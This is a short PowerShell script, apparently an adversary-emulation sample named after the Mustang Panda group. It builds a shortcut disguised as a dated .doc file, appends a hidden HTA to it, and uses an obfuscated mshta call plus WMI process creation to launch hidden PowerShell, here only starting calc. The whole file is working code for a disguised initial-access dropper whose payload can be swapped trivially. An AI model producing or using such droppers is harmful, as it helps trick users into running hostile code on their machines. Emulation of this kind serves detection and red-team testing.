# ==============================
# MUSTANG PANDA LNK
# ==============================

$hta_content = @"
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
<script language="VBScript">
Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator") 
Set objServices = objSWbemLocator.ConnectServer(".", "\root\cimv2")
set objProcess = objServices.Get("Win32_Process")
objProcess.Create("cmd.exe /c powershell.exe -nop -w hidden -c calc")
self.close
</script>
</head>
<body>
</body>
</html>
"@

Set-Content -Path test.hta -Value $hta_content 

$lnk_final = ".\2021-03-11.doc.lnk"
$lnk_temp = ".\output.lnk"

$wsh = New-Object -comobject WScript.Shell
$sc = $wsh.CreateShortcut($lnk_temp)
$sc.TargetPath = "%comspec%"
$sc.Arguments = "/c for %x in (%temp%=%cd%) do for /f ""delims=="" %i in ('dir ""%x\$lnk_final"" /s /b') do start m%windir:~-1,1%hta.exe ""%i"""
$sc.Save()
cmd.exe /c copy /b $lnk_temp+test.hta $lnk_final
